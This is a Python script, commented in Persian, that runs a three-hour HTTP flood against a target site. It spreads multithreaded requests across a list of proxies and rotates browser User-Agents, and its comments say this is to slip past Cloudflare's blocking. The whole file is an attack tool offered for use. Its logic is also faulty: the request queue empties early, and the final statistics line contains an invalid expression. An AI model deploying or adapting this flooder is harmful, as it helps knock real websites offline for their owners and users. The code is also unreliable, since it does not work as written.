import requests
import random
import time
import threading
from queue import Queue
from datetime import datetime, timedelta

# تنظیمات اولیه
target_url = "https://example.com"  # آدرس سایت هدف (اینو با آدرس خودت جایگزین کن)
attack_duration_hours = 3  # مدت زمان اتک (به ساعت)
attack_duration = attack_duration_hours * 60 * 60  # تبدیل به ثانیه
request_interval = 1.0  # فاصله بین درخواست‌ها (ثانیه) برای گول زدن Cloudflare
max_threads = 10  # تعداد نخ‌ها برای موازی‌سازی

# لیست User-Agent برای شبیه‌سازی درخواست‌های طبیعی
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# خواندن پروکسی‌های سالم از فایل (فرض می‌کنیم از قبل ذخیره شدن)
with open("working_proxies.txt", "r") as f:
    working_proxies = [line.strip() for line in f if line.strip()]

if not working_proxies:
    print("هیچ پروکسی سالمی پیدا نشد! لطفاً فایل working_proxies.txt رو چک کن.")
    exit()

# تابع ارسال درخواست با پروکسی و User-Agent تصادفی
def send_request(proxy):
    headers = {"User-Agent": random.choice(user_agents)}
    try:
        # تست اولیه با HEAD برای چک کردن Cloudflare
        head_response = requests.head(target_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=5)
        if head_response.status_code == 403 or head_response.status_code == 503:  # احتمال بلاک Cloudflare
            print(f"پروکسی {proxy} توسط Cloudflare بلاک شد. رد می‌شه.")
            return False
        
        # درخواست کامل اگر HEAD موفق بود
        response = requests.get(target_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=5)
        if response.status_code == 200:
            print(f"درخواست با {proxy} موفق بود. کد پاسخ: {response.status_code}")
            return True
        else:
            print(f"درخواست با {proxy} ناموفق بود. کد پاسخ: {response.status_code}")
            return False
    except:
        print(f"درخواست با {proxy} شکست خورد!")
        return False

# تابع کارگر برای هر نخ
def worker(queue):
    while True:
        proxy = queue.get()
        if proxy is None:
            break
        send_request(proxy)
        queue.task_done()

# زمان شروع و پایان
start_time = datetime.now()
end_time = start_time + timedelta(seconds=attack_duration)

# تنظیم صف و نخ‌ها
queue = Queue()
threads = []

# پر کردن صف با پروکسی‌ها
for _ in range(max_threads):
    for proxy in working_proxies:
        queue.put(proxy)

# شروع نخ‌ها
for _ in range(max_threads):
    thread = threading.Thread(target=worker, args=(queue,))
    threads.append(thread)
    thread.start()

# مدیریت زمان و توقف
print(f"شروع حمله در {start_time} - پایان در {end_time}")
while datetime.now() < end_time:
    time.sleep(request_interval)  # فاصله برای گول زدن Cloudflare

# توقف نخ‌ها
for _ in range(max_threads):
    queue.put(None)
for thread in threads:
    thread.join()

# نمایش آمار نهایی
total_requests = sum(1 for _ in range(queue.qsize()) + [1] * len(working_proxies) * max_threads)
successful_requests = sum(1 for proxy in working_proxies if send_request(proxy))  # تخمین تقریبی
print("\nحمله تموم شد!")
print(f"تعداد کل درخواست‌ها: {total_requests}")
print(f"تعداد درخواست‌های موفق: {successful_requests}")
print(f"درصد موفقیت: {(successful_requests / total_requests) * 100:.2f}%")
